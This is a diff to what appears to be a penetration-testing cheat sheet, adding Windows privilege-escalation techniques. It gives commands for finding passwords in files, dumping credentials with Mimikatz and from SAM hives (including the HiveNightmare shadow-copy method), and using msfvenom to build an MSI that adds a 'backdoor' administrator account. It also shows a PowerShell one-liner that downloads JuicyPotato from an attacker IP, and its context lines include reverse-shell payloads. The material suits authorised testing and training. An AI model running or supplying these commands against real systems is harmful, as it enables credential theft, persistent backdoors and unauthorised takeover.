@@ -560,6 +560,86 @@ curl -s --path-as-is -d "echo Content-Type: text/plain;" "192.168.56.125/cgi-bin
 ## Escalate Privileges
 ## WINDOWS
 
+Do some basic enumeration to figure out who we are, what OS this is, what privs we have and what patches have been installed.
+```
+whoami
+net user <username>
+ - net user administrator
+ - net user admin
+systeminfo
+net config Workstation 
+net users
+```
+What is running on the machine? 
+```
+wmic service list full > services.txt
+wmic process > processes.txt
+```
+### Search for file contents
+```
+cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
+findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt
+findstr /spin "password" *.*
+```
+### Processes running as system
+```
+tasklist /v /fi "username eq system"
+```
+### List Services
+```
+net start
+wmic service list brief
+tasklist /SVC
+```
+### Enumerate scheduled tasks
+```
+schtasks /query /fo LIST 2>nul | findstr TaskName
+schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+```
+### Check file Permissions 
+```
+icacls file_name
+
+Look for 
+BUILTIN\Users:(F)(Full access), BUILTIN\Users:(M)(Modify access) or BUILTIN\Users:(W)(Write-only access) in the output.
+```
+### Running Windows Privesc Check
+```
+git clone https://github.com/pentestmonkey/windows-privesc-check
+cd windows-privesc-check/
+python -m SimpleHTTPServer 80
+
+Transfer windows-privesc-check2.exe over to machine
+
+C:\Users\Admin>cd ..
+C:\Users>cd Public
+C:\Users\Public>cd Downloads
+C:\Users\Public\Downloads>windows-privesc-check2.exe --audit -a -o report
+windows-privesc-check v2.0svn198 (http://pentestmonkey.net/windows-privesc-check)...
+```
+
+### Running Mimikatz
+```
+https://github.com/gentilkiwi/mimikatz
+
+wget https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip
+
+COPY mimidrv.sys and mimikatz.exe and mimilib.dll to vuln machine
+
+ // IF no interactive shell then:
+mimikatz log version "sekurlsa::logonpasswords" exit
+ // ELSE
+mimikatz.exe
+mimikatz # privilege::debug
+Privilege '20' OK
+mimikatz # sekurlsa::logonpasswords
+```
+
+
+
+
+
 ### Upgrade meterpreter shell Windows
 ```
 1. Create a windows TCP reverse shell payload executable
@@ -653,7 +733,79 @@ rsync is a utility for efficiently transferring and synchronizing files between 
 rsync /etc/passwd /home/destination/
 rsync passwd /etc/passwd
 ```
- 
+
+### SAM and System Files
+The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.
+```
+Generate a hash file for John using pwdump or samdump2.
+
+pwdump SYSTEM SAM > /root/sam.txt
+samdump2 SYSTEM SAM -o sam.txt
+```
+Hive Nightmare
+Check for the vulnerability using icacls
+```
+icacls config\SAM
+
+OUTPUT:
+config\SAM BUILTIN\Administrators:(I)(F)
+           NT AUTHORITY\SYSTEM:(I)(F)
+           BUILTIN\Users:(I)(RX)    <-- this is wrong - regular users should not have read access!
+```
+Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.
+```
+mimikatz> token::whoami /full
+
+# List shadow copies available
+mimikatz> misc::shadowcopies
+
+# Extract account from SAM databases
+mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
+
+# Extract secrets from SECURITY
+mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
+```
+### AlwaysInstallElevated
+```
+Using the reg query command, you can check the status of the AlwaysInstallElevated registry key for both the user and the machine. If both queries return a value of 0x1, then AlwaysInstallElevated is enabled for both user and machine, indicating the system is vulnerable.
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+OR
+Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
+Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
+
+Create MSI package and install
+
+$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
+$ msiexec /quiet /qn /i C:\evil.msi
+```
+### Juicy Potato
+Versions
+Windows_10_Enterprise
+Windows_10_Pro
+Windows_7_Enterprise
+Windows_8.1_Enterprise
+Windows_Server_2008_R2_Enterprise
+Windows_Server_2012_Datacenter
+
+https://github.com/ohpe/juicy-potato/releases
+```
+powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.23:8070/JuicyPotato.exe', 'C:\Users\public\JuicyPotato.exe')" -bypass executionpolicy
+
+.\JuicyPotato.exe -h
+
+To run the tool, we need a port number for the COM server and a valid CLSID
+
+Run systeminfo
+Find target OS and use link to find CLSIDS of every OS - wuauserv
+https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+
+
+'\juicypotato.exe -t * -p shell.bat -l 4545 -c "CLSID" 4545'
+```
+
 ### Export SAM and SYSTEM file to kali machine
 ```
 impacket-smbserver share -smb2support -username USER -password PASS
@@ -697,6 +849,9 @@ msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=10.10.14.28 LPORT=443 -f 
 nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
 cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
 ```
+
+
+
 
 ## Payloads
 
